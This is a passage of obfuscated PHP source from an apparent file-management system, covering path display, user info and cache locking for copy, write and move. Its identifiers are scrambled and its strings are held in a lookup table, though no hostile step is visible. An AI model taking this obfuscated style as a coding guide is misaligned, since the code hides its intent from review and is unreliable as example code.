=& $_SERVER[çâ¥×ø³]; if (Model($©Ñ²ä¦[476])->get($©Ñ²ä¦[539]) != $©Ñ²ä¦[88]) { return; } static $ç§óÙÏ = false; if (!$ç§óÙÏ) { $Éƒ—Œ = Model($©Ñ²ä¦[540]); $ÒÙ”æ˜ò = Model($©Ñ²ä¦[541]); $ç§óÙÏ = $ÒÙ”æ˜ò->listData(); $ç§óÙÏ = array_to_keyvalue($ç§óÙÏ, $©Ñ²ä¦[181]); $÷æ—õç = json_decode(Model($©Ñ²ä¦[476])->get($©Ñ²ä¦[542]), !0); $÷æ—õç = array_to_keyvalue($÷æ—õç, $©Ñ²ä¦[443]); foreach ($ç§óÙÏ as $›š“Ğö => $ÊÍÉÒ–) { $åÆË = $÷æ—õç[$ÊÍÉÒ–[$©Ñ²ä¦[543]]]; if (!$åÆË) { $ÒÙ”æ˜ò->remove($ÊÍÉÒ–[$©Ñ²ä¦[443]]); unset($ç§óÙÏ[$›š“Ğö]); continue; } $»ÑÏóÙ = $Éƒ—Œ->listData($åÆË[$©Ñ²ä¦[455]]); if (!$»ÑÏóÙ) { $ÒÙ”æ˜ò->remove($ÊÍÉÒ–[$©Ñ²ä¦[443]]); unset($ç§óÙÏ[$›š“Ğö]); continue; } $ÊÍÉÒ–[$©Ñ²ä¦[455]] = $»ÑÏóÙ; $ÊÍÉÒ–[$©Ñ²ä¦[544]] = $åÆË; $ÊÍÉÒ–[$©Ñ²ä¦[545]] = Model($©Ñ²ä¦[546])->getInfoSimpleOuter($ÊÍÉÒ–[$©Ñ²ä¦[495]]); $ç§óÙÏ[$›š“Ğö] = $ÊÍÉÒ–; } } $¤´ÊÖô÷ = USER_ID; $×øùäË = array(); $ÆğÂÖ½¼ = $this->_listAppendPath($×øùäË, !0); foreach ($ó·•ÀºÍ as $›š“Ğö => &$ÊÍÉÒ–) { if (!is_array($ÊÍÉÒ–[$©Ñ²ä¦[455]])) { continue; } if ($ÊÍÉÒ–[$©Ñ²ä¦[178]] != $©Ñ²ä¦[547]) { continue; } if (isset($ç§óÙÏ[$ÊÍÉÒ–[$©Ñ²ä¦[181]]])) { $öãîƒÓ = $ç§óÙÏ[$ÊÍÉÒ–[$©Ñ²ä¦[181]]]; if (!is_array($ÊÍÉÒ–[$©Ñ²ä¦[507]])) { $ÊÍÉÒ–[$©Ñ²ä¦[507]] = array(); } $ÊÍÉÒ–[$©Ñ²ä¦[507]][$©Ñ²ä¦[548]] = $öãîƒÓ[$©Ñ²ä¦[543]]; $ÊÍÉÒ–[$©Ñ²ä¦[455]][$©Ñ²ä¦[549]] = $öãîƒÓ; $ÊÍÉÒ–[$©Ñ²ä¦[455]][$©Ñ²ä¦[550]] = $ÊÍÉÒ–[$©Ñ²ä¦[551]]; $ÊÍÉÒ–[$©Ñ²ä¦[455]][$©Ñ²ä¦[552]] = $©Ñ²ä¦[88]; if ($öãîƒÓ[$©Ñ²ä¦[495]] != $¤´ÊÖô÷) { $ÊÍÉÒ–[$©Ñ²ä¦[455]][$©Ñ²ä¦[456]] = $ÊÍÉÒ–[$©Ñ²ä¦[455]][$©Ñ²ä¦[456]] & $öãîƒÓ[$©Ñ²ä¦[455]][$©Ñ²ä¦[455]]; } continue; } $ÔÈšÖúÓ = $this->parentLevelArray($ÊÍÉÒ–[$©Ñ²ä¦[553]]); $Îú›£ë¾ = array_reverse($ÔÈšÖúÓ); foreach ($Îú›£ë¾ as $×½é±øÙ => $ï¿¤ßÌ®) { if (!isset($ç§óÙÏ[$ï¿¤ßÌ®])) { continue; } $öãîƒÓ = $ç§óÙÏ[$ï¿¤ßÌ®]; $ÊÍÉÒ–[$©Ñ²ä¦[455]][$©Ñ²ä¦[549]] = $öãîƒÓ; if ($öãîƒÓ[$©Ñ²ä¦[495]] != $¤´ÊÖô÷) { $ÊÍÉÒ–[$©Ñ²ä¦[455]][$©Ñ²ä¦[456]] = $ÊÍÉÒ–[$©Ñ²ä¦[455]][$©Ñ²ä¦[456]] & $öãîƒÓ[$©Ñ²ä¦[455]][$©Ñ²ä¦[455]]; } $§¤å½¾ = $©Ñ²ä¦[12]; $·ãĞèÔ = count($ÔÈšÖúÓ) - $×½é±øÙ; for ($›°ÕÇÈß = 0; $›°ÕÇÈß < $·ãĞèÔ; $›°ÕÇÈß++) { if (!isset($ÆğÂÖ½¼[$ÔÈšÖúÓ[$›°ÕÇÈß]])) { $§¤å½¾ = $©Ñ²ä¦[12]; break; } $§¤å½¾ = $§¤å½¾ . rtrim($ÆğÂÖ½¼[$ÔÈšÖúÓ[$›°ÕÇÈß]], $©Ñ²ä¦[8]) . $©Ñ²ä¦[8]; } $ÊÍÉÒ–[$©Ñ²ä¦[455]][$©Ñ²ä¦[550]] = rtrim($§¤å½¾, $©Ñ²ä¦[8]) . $©Ñ²ä¦[8]; break; } } unset($ÊÍÉÒ–); } public function groupPathDisplay(&$ŒÕ©µ˜ç) { $¾ûƒÄ– =& $_SERVER[çâ¥×ø³]; if ($ŒÕ©µ˜ç[$¾ûƒÄ–[178]] != self::TYPE_GROUP) { return; } $®€µŒ = Model($¾ûƒÄ–[554])->getInfo($ŒÕ©µ˜ç[$¾ûƒÄ–[538]]); $µ÷Ëï²Œ = $this->parentLevelArray($®€µŒ[$¾ûƒÄ–[553]]); $Ğ’Ö¼É¬ = $¾ûƒÄ–[12]; foreach ($µ÷Ëï²Œ as $ÌÒøŒñ») { $›…ıÃâ = Model($¾ûƒÄ–[554])->getInfo($ÌÒøŒñ»); $Ğ’Ö¼É¬ .= $›…ıÃâ[$¾ûƒÄ–[87]][$¾ûƒÄ–[181]] . $¾ûƒÄ–[50]; } $ŒÕ©µ˜ç[$¾ûƒÄ–[555]] = $®€µŒ[$¾ûƒÄ–[180]]; $ŒÕ©µ˜ç[$¾ûƒÄ–[556]] = $®€µŒ[$¾ûƒÄ–[553]]; $ŒÕ©µ˜ç[$¾ûƒÄ–[557]] = $®€µŒ[$¾ûƒÄ–[558]]; $ŒÕ©µ˜ç[$¾ûƒÄ–[559]] = $Ğ’Ö¼É¬ . $®€µŒ[$¾ûƒÄ–[87]][$¾ûƒÄ–[181]]; } protected function _listAppendPath(&$áõ Î, $À¹ş½¤á = false) { $¸şøıƒÔ =& $_SERVER[çâ¥×ø³]; static $ª©ÕÔÂÖ = array(); $áİØ²‰¤ = array(); $÷¤¥šç÷ = array(); if ($À¹ş½¤á) { return $ª©ÕÔÂÖ; } foreach ($áõ Î as &$¨äÏÈ¢ô) { $ŒÎ·éÆ = $¨äÏÈ¢ô[$¸şøıƒÔ[181]]; if ($¨äÏÈ¢ô[$¸şøıƒÔ[453]] == $¸şøıƒÔ[88] && $¨äÏÈ¢ô[$¸şøıƒÔ[180]] != 0) { $ª©ÕÔÂÖ[$ŒÎ·éÆ] = $¨äÏÈ¢ô[$¸şøıƒÔ[32]]; } if ($¨äÏÈ¢ô[$¸şøıƒÔ[453]] == $¸şøıƒÔ[88] && $¨äÏÈ¢ô[$¸şøıƒÔ[180]] == 0) { $ª©ÕÔÂÖ[$ŒÎ·éÆ] = $this->_listAppendPathRoot($¨äÏÈ¢ô, array()); } if (isset($÷¤¥šç÷[$¨äÏÈ¢ô[$¸şøıƒÔ[553]]])) { continue; } $÷¤¥šç÷[$¨äÏÈ¢ô[$¸şøıƒÔ[553]]] = !0; $ÖÒÆç´® = $this->parentLevelArray($¨äÏÈ¢ô[$¸şøıƒÔ[553]]); foreach ($ÖÒÆç´® as $´óÆ¬•¬ => $±ùÌ—œ…) { if (isset($ª©ÕÔÂÖ[$±ùÌ—œ…])) { continue; } if ($´óÆ¬•¬ == 0) { $ª©ÕÔÂÖ[$±ùÌ—œ…] = $this->_listAppendPathRoot($¨äÏÈ¢ô, $ÖÒÆç´®); } if ($´óÆ¬•¬ != 0) { $áİØ²‰¤[] = $±ùÌ—œ…; } } } unset($¨äÏÈ¢ô); $áİØ²‰¤ = array_unique($áİØ²‰¤); if (count($áİØ²‰¤) > 0) { $ëËˆß‚Õ = array($¸şøıƒÔ[459] => array($¸şøıƒÔ[460], $áİØ²‰¤)); if (count($áİØ²‰¤) == 1) { $Ûååîˆœ = $this->sourceInfo($áİØ²‰¤[0]); $›”óÈñ = is_array($Ûååîˆœ) ? array($Ûååîˆœ) : !1; } else { $›”óÈñ = $this->field($¸şøıƒÔ[560])->where($ëËˆß‚Õ)->select(); } if (!$›”óÈñ) { $›”óÈñ = array(); } foreach ($›”óÈñ as $ø½éÛ) { $ª©ÕÔÂÖ[$ø½éÛ[$¸şøıƒÔ[181]]] = $ø½éÛ[$¸şøıƒÔ[32]]; } } $ıå§Á = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $‘ÁÜ½ = array(); foreach ($áõ Î as &$¨äÏÈ¢ô) { $¹ ¹ÄÁ« = $¨äÏÈ¢ô[$¸şøıƒÔ[553]]; $åŸàş‹Ô = $¸şøıƒÔ[12]; if (isset($‘ÁÜ½[$¹ ¹ÄÁ«])) { $åŸàş‹Ô = $‘ÁÜ½[$¹ ¹ÄÁ«]; } else { $ÖÒÆç´® = $this->parentLevelArray($¨äÏÈ¢ô[$¸şøıƒÔ[553]]); foreach ($ÖÒÆç´® as $´óÆ¬•¬ => $±ùÌ—œ…) { if (isset($ª©ÕÔÂÖ[$±ùÌ—œ…])) { $åŸàş‹Ô .= $ª©ÕÔÂÖ[$±ùÌ—œ…] . $¸şøıƒÔ[8]; } } $‘ÁÜ½[$¹ ¹ÄÁ«] = $åŸàş‹Ô; } $åŸàş‹Ô .= $¨äÏÈ¢ô[$¸şøıƒÔ[32]]; if ($¨äÏÈ¢ô[$¸şøıƒÔ[453]] == $¸şøıƒÔ[88]) { $åŸàş‹Ô .= $¸şøıƒÔ[8]; } $¨äÏÈ¢ô[$¸şøıƒÔ[551]] = str_replace($¸şøıƒÔ[561], $¸şøıƒÔ[8], $åŸàş‹Ô); if ($¨äÏÈ¢ô[$¸şøıƒÔ[180]] == $¸şøıƒÔ[212]) { $¨äÏÈ¢ô[$¸şøıƒÔ[32]] = trim($ª©ÕÔÂÖ[$¨äÏÈ¢ô[$¸şøıƒÔ[181]]], $¸şøıƒÔ[8]); $¨äÏÈ¢ô[$¸şøıƒÔ[551]] = $¨äÏÈ¢ô[$¸şøıƒÔ[32]] . $¸şøıƒÔ[8]; } if (intval($¨äÏÈ¢ô[$¸şøıƒÔ[178]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($¨äÏÈ¢ô, $ÖÒÆç´®, $ıå§Á); } } unset($¨äÏÈ¢ô); return $áõ Î; } private function _listAppendPathRecycle(&$ºêøÂÂ, $ôÏöä¯õ, $´ÖïşÛ¸) { $× Îà¹ =& $_SERVER[çâ¥×ø³]; if (!in_array($´ÖïşÛ¸, $ôÏöä¯õ) && $ºêøÂÂ[$× Îà¹[181]] != $´ÖïşÛ¸) { return; } $„š‘å’Ğ = explode($× Îà¹[8], trim($ºêøÂÂ[$× Îà¹[551]], $× Îà¹[8])); $ˆëæÈŸÈ = implode($× Îà¹[8], array_slice($„š‘å’Ğ, 2)); $ºêøÂÂ[$× Îà¹[551]] = $× Îà¹[8] . LNG($× Îà¹[562]) . $× Îà¹[8] . ltrim($ˆëæÈŸÈ, $× Îà¹[8]); $ºêøÂÂ[$× Îà¹[553]] = $× Îà¹[563] . implode($× Îà¹[50], array_slice($ôÏöä¯õ, 1)) . $× Îà¹[50]; if ($ºêøÂÂ[$× Îà¹[181]] == $´ÖïşÛ¸) { $ºêøÂÂ[$× Îà¹[553]] = $× Îà¹[563]; $ºêøÂÂ[$× Îà¹[180]] = $× Îà¹[212]; $ºêøÂÂ[$× Îà¹[32]] = LNG($× Îà¹[562]); } $ºêøÂÂ[$× Îà¹[564]] = $× Îà¹[565]; } protected function _listAppendPathRoot(&$—ÆªºÏ³, $ÖæŒËğï) { $ÔŠ¤²ï =& $_SERVER[çâ¥×ø³]; static $µ®Ææâ¥ = false; $¯Ñ¦ß– = $ÔŠ¤²ï[12]; if ($—ÆªºÏ³[$ÔŠ¤²ï[178]] == self::TYPE_USER) { if ($—ÆªºÏ³[$ÔŠ¤²ï[538]] == USER_ID) { $¯Ñ¦ß– = LNG($ÔŠ¤²ï[566]); if ($µ®Ææâ¥ === !1) { $Ÿá¾·Ú³ = Model($ÔŠ¤²ï[567])->getInfoFull(USER_ID); $µ®Ææâ¥ = _get($Ÿá¾·Ú³, $ÔŠ¤²ï[568], $ÔŠ¤²ï[12]); } if ($ÖæŒËğï && $ÖæŒËğï[0] == $µ®Ææâ¥ || !$ÖæŒËğï && $—ÆªºÏ³[$ÔŠ¤²ï[181]] == $µ®Ææâ¥) { $¯Ñ¦ß– = LNG($ÔŠ¤²ï[569]); $—ÆªºÏ³[$ÔŠ¤²ï[570]] = $ÔŠ¤²ï[571]; } if (!$ÖæŒËğï) { $—ÆªºÏ³[$ÔŠ¤²ï[32]] = $¯Ñ¦ß–; } } else { $—ÆªºÏ³[$ÔŠ¤²ï[572]] = Model($ÔŠ¤²ï[546])->getInfoSimpleOuter($—ÆªºÏ³[$ÔŠ¤²ï[538]]); $¯Ñ¦ß– = LNG($ÔŠ¤²ï[573]) . $ÔŠ¤²ï[163] . $—ÆªºÏ³[$ÔŠ¤²ï[572]][$ÔŠ¤²ï[32]] . $ÔŠ¤²ï[165]; } } else { if ($—ÆªºÏ³[$ÔŠ¤²ï[178]] == self::TYPE_GROUP) { $­†ø€÷ = Model($ÔŠ¤²ï[554])->getInfoSimple($—ÆªºÏ³[$ÔŠ¤²ï[538]]); $¯Ñ¦ß– = $­†ø€÷[$ÔŠ¤²ï[32]]; } else { if ($—ÆªºÏ³[$ÔŠ¤²ï[178]] == self::TYPE_SYSTEM) { $¯Ñ¦ß– = $ÔŠ¤²ï[574]; } } } $¯Ñ¦ß– = $¯Ñ¦ß– ? $ÔŠ¤²ï[8] . $¯Ñ¦ß– . $ÔŠ¤²ï[8] : $ÔŠ¤²ï[8]; return $¯Ñ¦ß–; } protected function _listAppendUser(&$ìØèˆ¹ş) { $ô¸§Šˆ¯ =& $_SERVER[çâ¥×ø³]; $î²İ®Ñ = array_to_keyvalue($ìØèˆ¹ş, $ô¸§Šˆ¯[12], $ô¸§Šˆ¯[495]); $„ĞŸÕı = array_to_keyvalue($ìØèˆ¹ş, $ô¸§Šˆ¯[12], $ô¸§Šˆ¯[497]); $şãµŠ÷£ = array_merge($î²İ®Ñ, $„ĞŸÕı); $ÂóÓÍú— = Model($ô¸§Šˆ¯[567])->userListInfo($şãµŠ÷£); foreach ($ìØèˆ¹ş as &$òĞ¾×¿İ) { $‚ïß‚ã… = $òĞ¾×¿İ[$ô¸§Šˆ¯[495]]; $òĞ¾×¿İ[$ô¸§Šˆ¯[495]] = $ÂóÓÍú—[$‚ïß‚ã…] ? $ÂóÓÍú—[$‚ïß‚ã…] : !1; $‚ïß‚ã… = $òĞ¾×¿İ[$ô¸§Šˆ¯[497]]; $òĞ¾×¿İ[$ô¸§Šˆ¯[497]] = $ÂóÓÍú—[$‚ïß‚ã…] ? $ÂóÓÍú—[$‚ïß‚ã…] : !1; if (isset($òĞ¾×¿İ[$ô¸§Šˆ¯[507]]) && $òĞ¾×¿İ[$ô¸§Šˆ¯[507]][$ô¸§Šˆ¯[575]]) { $²Ã­â¨Ë = $GLOBALS[$ô¸§Šˆ¯[6]][$ô¸§Šˆ¯[89]][$ô¸§Šˆ¯[576]]; if ($òĞ¾×¿İ[$ô¸§Šˆ¯[507]][$ô¸§Šˆ¯[577]] <= time() - $²Ã­â¨Ë) { $this->metaSet($òĞ¾×¿İ[$ô¸§Šˆ¯[181]], $ô¸§Šˆ¯[575], null); $this->metaSet($òĞ¾×¿İ[$ô¸§Šˆ¯[181]], $ô¸§Šˆ¯[577], null); unset($òĞ¾×¿İ[$ô¸§Šˆ¯[507]][$ô¸§Šˆ¯[575]]); continue; } $ÀÎÚÛ«” = $òĞ¾×¿İ[$ô¸§Šˆ¯[507]][$ô¸§Šˆ¯[575]]; $òĞ¾×¿İ[$ô¸§Šˆ¯[507]][$ô¸§Šˆ¯[578]] = Model($ô¸§Šˆ¯[567])->getInfoSimpleOuter($ÀÎÚÛ«”); } } unset($òĞ¾×¿İ); } public function parentLevelArray($¿Ç›¥è) { $ñ€øã =& $_SERVER[çâ¥×ø³]; $¿Ç›¥è = explode($ñ€øã[50], trim($¿Ç›¥è, $ñ€øã[50])); return array_remove_value($¿Ç›¥è, $ñ€øã[212]); } public function listAll($á»åæÕ›) { $›ø£§¡ú =& $_SERVER[çâ¥×ø³]; $Û¹ÀŠù = $this->sourceInfo($á»åæÕ›); $¦Æ¤¬‰ = array($›ø£§¡ú[579] => array($›ø£§¡ú[580], $Û¹ÀŠù[$›ø£§¡ú[553]] . $á»åæÕ› . $›ø£§¡ú[581]), $›ø£§¡ú[582] => 0); $Ò€Ó‚ôî = $›ø£§¡ú[583]; $Şˆ®‹© = "\114\105\x46\124\40\112\117\111\116\x20{$this->tablePrefix}\x69\x6f\137\146\x69\154\x65\x20\146\151\x6c\x65\x20\x6f\156\40\x73\x6f\165\162\x63\145\56\x66\151\x6c\x65\111\x44\x20\x3d\40\x66\x69\x6c\145\56\x66\x69\x6c\145\x49\x44"; $‹Èèµš¶ = $this->alias($›ø£§¡ú[487])->field($Ò€Ó‚ôî)->where($¦Æ¤¬‰)->join($Şˆ®‹©)->select(); $this->_listAppendAuth($‹Èèµš¶); $this->_listAppendUser($‹Èèµš¶); $this->_listAppendPath($‹Èèµš¶); $‹Èèµš¶ = array_to_keyvalue($‹Èèµš¶, $›ø£§¡ú[181]); $Ü´ÑÕÔÁ = "\x2f{$Û¹ÀŠù[$›ø£§¡ú[32]]}\x2f"; $Ü´ÑÕÔÁ = $Ü´ÑÕÔÁ == $›ø£§¡ú[561] ? $›ø£§¡ú[8] : $Ü´ÑÕÔÁ; $úéÃ™Áğ = array(); foreach ($‹Èèµš¶ as $†î„²÷• => $›Û±ñŒ ) { $“³ªù¢ó = $this->parentLevelArray($›Û±ñŒ [$›ø£§¡ú[553]]); array_shift($“³ªù¢ó); $Ï½ûıÈ‚ = $Ü´ÑÕÔÁ; for ($¹Ğö»ıî = 0; $¹Ğö»ıî < count($“³ªù¢ó); $¹Ğö»ıî++) { $Ï½ûıÈ‚ .= $‹Èèµš¶[$“³ªù¢ó[$¹Ğö»ıî]][$›ø£§¡ú[32]] . $›ø£§¡ú[8]; } $Ï½ûıÈ‚ .= $›Û±ñŒ [$›ø£§¡ú[32]]; if ($›Û±ñŒ [$›ø£§¡ú[453]]) { $Ï½ûıÈ‚ .= $›ø£§¡ú[8]; } $ü™¥Â¶ = array($›ø£§¡ú[463] => str_replace($›ø£§¡ú[561], $›ø£§¡ú[8], str_replace($›ø£§¡ú[561], $›ø£§¡ú[8], str_replace($›ø£§¡ú[561], $›ø£§¡ú[8], $Ï½ûıÈ‚))), $›ø£§¡ú[584] => intval($›Û±ñŒ [$›ø£§¡ú[453]]), $›ø£§¡ú[585] => intval($›Û±ñŒ [$›ø£§¡ú[76]]), $›ø£§¡ú[85] => intval($›Û±ñŒ [$›ø£§¡ú[85]]), $›ø£§¡ú[87] => $this->pathInfoFilter($›Û±ñŒ )); if (!$ü™¥Â¶[$›ø£§¡ú[453]]) { $ü™¥Â¶[$›ø£§¡ú[509]] = $›Û±ñŒ [$›ø£§¡ú[509]]; } $úéÃ™Áğ[] = $ü™¥Â¶; } $úéÃ™Áğ = array_sort_by($úéÃ™Áğ, $›ø£§¡ú[84]); return $úéÃ™Áğ; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($æøÃ¦Ô‹) { $çàÖŸ³ã =& $_SERVER[çâ¥×ø³]; if (!$this->allowLock()) { return; } $this->_lockCheck($çàÖŸ³ã[586], $æøÃ¦Ô‹); $ëÂï¢–  = 1; $this->_lockEvent($æøÃ¦Ô‹, array($çàÖŸ³ã[587], $çàÖŸ³ã[588]), $ëÂï¢– ); $this->_lockParent($æøÃ¦Ô‹, array($çàÖŸ³ã[588]), $ëÂï¢– ); $this->_lockEvent($æøÃ¦Ô‹, array($çàÖŸ³ã[589], $çàÖŸ³ã[590]), $ëÂï¢– ); $this->_lockCheckEnd($çàÖŸ³ã[586], $æøÃ¦Ô‹); } public function lockCopyEnd($õ¬¥¾‡ø) { $øìş²·Ö =& $_SERVER[çâ¥×ø³]; if (!$this->allowLock()) { return; } $ˆ§õÇ•¢ = 0; $this->_lockEvent($õ¬¥¾‡ø, array($øìş²·Ö[587], $øìş²·Ö[588]), $ˆ§õÇ•¢); $this->_lockParent($õ¬¥¾‡ø, array($øìş²·Ö[588]), $ˆ§õÇ•¢); $this->_lockEvent($õ¬¥¾‡ø, array($øìş²·Ö[589], $øìş²·Ö[590]), $ˆ§õÇ•¢); } public function lockWriteStart($»ÎüÕÑ, $Ÿ˜ˆûÒÊ = '') { $æ¬­›É =& $_SERVER[çâ¥×ø³]; if (!$this->allowLock()) { return; } $this->_lockCheck($æ¬­›É[587], $»ÎüÕÑ); $›Ñö² = 1; $this->_lockKey($æ¬­›É[591] . $»ÎüÕÑ . $æ¬­›É[10] . $Ÿ˜ˆûÒÊ, $›Ñö²); $this->_lockEvent($»ÎüÕÑ, array($æ¬­›É[586], $æ¬­›É[588]), $›Ñö²); $this->_lockParent($»ÎüÕÑ, array($æ¬­›É[586], $æ¬­›É[588]), $›Ñö²); $this->_lockCheckEnd($æ¬­›É[587], $»ÎüÕÑ); } public function lockWriteEnd($ÒãªÍå‘, $õüœ‡’ = '') { $²ÉàÑ¡Ó =& $_SERVER[çâ¥×ø³]; if (!$this->allowLock()) { return; } $¹£ıî§â = 0; $this->_lockKey($²ÉàÑ¡Ó[591] . $ÒãªÍå‘ . $²ÉàÑ¡Ó[10] . $õüœ‡’, $¹£ıî§â); $this->_lockEvent($ÒãªÍå‘, array($²ÉàÑ¡Ó[586], $²ÉàÑ¡Ó[588]), $¹£ıî§â); $this->_lockParent($ÒãªÍå‘, array($²ÉàÑ¡Ó[586], $²ÉàÑ¡Ó[588]), $¹£ıî§â); } public function lockMoveStart($¨ïŒÑ‚) { $ã¿ºÅ±Ğ =& $_SERVER[çâ¥×ø³]; if (!$this->allowLock()) { return; } $this->_lockCheck($ã¿ºÅ±Ğ[588], $¨ïŒÑ‚); $†üø²áü = 1; $this->_lockKey($ã¿ºÅ±Ğ[592] . $¨ïŒÑ‚, $†üø²áü); $this->_lockEvent($¨ïŒÑ‚, array($ã¿ºÅ±Ğ[586], $ã¿ºÅ±Ğ[587]), $†üø²áü); $this->_lockParent($¨ïŒÑ‚, array($ã¿ºÅ±Ğ[586], $ã¿ºÅ±Ğ[588]), $†üø²áü); $this->_lockEvent($¨ïŒÑ‚, array($ã¿ºÅ±Ğ[593], $ã¿ºÅ±Ğ[589], $ã¿ºÅ±Ğ[590]), $†üø²áü); $this->_lockCheckEnd($ã¿ºÅ±Ğ[588], $¨ïŒÑ‚); } public function lockMoveEnd($€ƒƒ—èÆ) { $¥ÇãùÙ¾ =& $_SERVER[çâ¥×ø³]; if (!$this->allowLock()) { return; } $«¾Ğú¦å = 0; $this->_lockKey($¥ÇãùÙ¾[592] . $€ƒƒ—èÆ, $«¾Ğú¦å); $this->_lockEvent($€ƒƒ—èÆ, array($¥ÇãùÙ¾[586], $¥ÇãùÙ¾[587]), $«¾Ğú¦å); $this->_lockParent($€ƒƒ—èÆ, array($¥ÇãùÙ¾[586], $¥ÇãùÙ¾[588]), $«¾Ğú¦å); $this->_lockEvent($€ƒƒ—èÆ, array($¥ÇãùÙ¾[593], $¥ÇãùÙ¾[589], $¥ÇãùÙ¾[590]), $«¾Ğú¦å); } private function _lockCheck($³Êü‰Øã, $¢ÚçˆŸÌ) { $ıäšÜö† =& $_SERVER[çâ¥×ø³]; $áìßñ ˆ = $this->sourceInfo($¢ÚçˆŸÌ); $¼İ²§Á¿ = $³Êü‰Øã . $ıäšÜö†[10] . $¢ÚçˆŸÌ; $this->_lockTimeStart[$¼İ²§Á¿] = timeFloat(); if (!is_array($áìßñ ˆ)) { return; } $§Éæ˜¸î = LNG($ıäšÜö†[594]); CacheLock::setErrorMsg($ıäšÜö†[163] . htmlspecialchars($áìßñ ˆ[$ıäšÜö†[32]]) . $ıäšÜö†[165] . $§Éæ˜¸î); $this->_lockKey($¼İ²§Á¿, 1); $this->_lockKey($¼İ²§Á¿, 0); $ı­£Ö¬Å = array_reverse($this->parentLevelArray($áìßñ ˆ[$ıäšÜö†[553]])); foreach ($ı­£Ö¬Å as $Ğù²Î¥º) { $¼İ²§Á¿ = $³Êü‰Øã . $ıäšÜö†[595] . $Ğù²Î¥º; if (CacheLock::lockGet($ıäšÜö†[596] . $¼İ²§Á¿)) { $áìßñ ˆ = $this->sourceInfo($Ğù²Î¥º); CacheLock::setErrorMsg($ıäšÜö†[163] . htmlspecialchars($áìßñ ˆ[$ıäšÜö†[32]]) . $ıäšÜö†[165] . $§Éæ˜¸î); $this->_lockKey($¼İ²§Á¿, 1); $this->_lockKey($¼İ²§Á¿, 0); } } } private function _lockCheckEnd($·“°ôŒ, $îïšÚÍ›) { $ÅÎ©Ü =& $_SERVER[çâ¥×ø³]; $«Ã±ùóî = $·“°ôŒ . $ÅÎ©Ü[10] . $îïšÚÍ›; CacheLock::setErrorMsg($ÅÎ©Ü[422]); if (!isset($this->_lockTimeStart[$«Ã±ùóî])) { return; } $æß®Åú© = timeFloat() - $this->_lockTimeStart[$«Ã±ùóî]; unset($this->_lockTimeStart[$«Ã±ùóî]); if ($æß®Åú© > 0.5) { unset(self::$cacheSourceInfo[$ÅÎ©Ü[501] . $îïšÚÍ›]); } $ŞØÉŒÕ¨ = $this->sourceInfo($îïšÚÍ›); if (!$ŞØÉŒÕ¨) { show_json(LNG($ÅÎ©Ü[105]), !1); } } private function _lockParent($¿ï¿ÆÄ, $åªôö˜™, $š„—Ã‘‡) { if (!$this->autoLockSet) { return; } $ßÊØÛÖ  = $this->sourceInfo($¿ï¿ÆÄ); if (!is_array($ßÊØÛÖ )) { return; } $Ò‚÷Ñ¹æ = array_reverse($this->parentLevelArray($ßÊØÛÖ [$_SERVER[çâ¥×ø³][553]])); foreach ($Ò‚÷Ñ¹æ as $†›ö®¡) { $this->_lockEvent($†›ö®¡, $åªôö˜™, $š„—Ã‘‡); } } private function _lockEvent($åúû¯Ò, $ÓÆ‚Ôá‹, $øÈ°èÅ) { $†«Õ•ŸÆ =& $_SERVER[çâ¥×ø³]; if (!$this->autoLockSet) { return; } foreach ($ÓÆ‚Ôá‹ as $ò¾ŸÈ¡†) { $”»’“œ† = $ò¾ŸÈ¡† . $†«Õ•ŸÆ[10] . $åúû¯Ò; if ($øÈ°èÅ && CacheLock::lockGet($†«Õ•ŸÆ[596] . $”»’“œ†)) { continue; } $this->_lockKey($”»’“œ†, $øÈ°èÅ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($­Â‰‹³º, $éçÎÍÃ” = 1) { $¯š¨ÓÚà = $_SERVER[çâ¥×ø³][596] . md5($­Â‰‹³º); if ($éçÎÍÃ”) { if (isset(self::$_lockItemArr[$¯š¨ÓÚà])) { return; } self::$_lockItemArr[$¯š¨ÓÚà] = 1; CacheLock::lock($¯š¨ÓÚà, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$¯š¨ÓÚà])) { return; } unset(self::$_lockItemArr[$¯š¨ÓÚà]); CacheLock::unlock($¯š¨ÓÚà); } } public function isParentOf($üÒÒ¾©, $×ƒşÛ½™) { $Õœİ“ ¢ =& $_SERVER[çâ¥×ø³]; $Ò·‘¶À¹ = $this->sourceInfo($üÒÒ¾©); $ìİË®¢Ë = $this->sourceInfo($×ƒşÛ½™); $äÔ•ìüö = $Ò·‘¶À¹[$Õœİ“ ¢[553]] . $Ò·‘¶À¹[$Õœİ“ ¢[181]] . $Õœİ“ ¢[50]; $„óÓÑ½ = $ìİË®¢Ë[$Õœİ“ ¢[553]] . $ìİË®¢Ë[$Õœİ“ ¢[181]] . $Õœİ“ ¢[50]; $È’×‚½Ï = strpos($„óÓÑ½, $äÔ•ìüö) === 0; return $È’×‚½Ï; } private $targetIsDelete = 0; public function copy($¦Ñµ¥‡, $ãÔèŠ¸Ø, $ÎÉ¾± = REPEAT_REPLACE, $øÙ´ÃÛ = '') { $ÎÖØøåÂ =& $_SERVER[çâ¥×ø³]; $›Ã‹÷£ = $this->sourceInfo($¦Ñµ¥‡); $Ó­Œ¼»Ä = $this->sourceInfo($ãÔèŠ¸Ø); if (!$›Ã‹÷£ || !$Ó­Œ¼»Ä || $Ó­Œ¼»Ä[$ÎÖØøåÂ[453]] != $ÎÖØøåÂ[88]) { return !1; } if ($this->isParentOf($¦Ñµ¥‡, $ãÔèŠ¸Ø)) { return !1; } $Ÿ€¡“‹ô = $øÙ´ÃÛ ? $øÙ´ÃÛ : $›Ã‹÷£[$ÎÖØøåÂ[32]]; $this->lockCopyStart($¦Ñµ¥‡); $this->lockWriteStart($ãÔèŠ¸Ø, $Ÿ€¡“‹ô); $šôæç¹£ = array($ÎÖØøåÂ[597] => array(), $ÎÖØøåÂ[598] => array(), $ÎÖØøåÂ[599] => array()); $this->targetIsDelete = intval($›Ã‹÷£[$ÎÖØøåÂ[473]]); $Ø²Ùıªµ = $this->fileNameExistAuto($ãÔèŠ¸Ø, $›Ã‹÷£); $úä«¢ôæ = $this->_copy($¦Ñµ¥‡, $ãÔèŠ¸Ø, $ÎÉ¾±, $šôæç¹£, !0, $øÙ´ÃÛ); $this->_childrenListClear(); $this->lockCopyEnd($¦Ñµ¥‡); $this->lockWriteEnd($ãÔèŠ¸Ø, 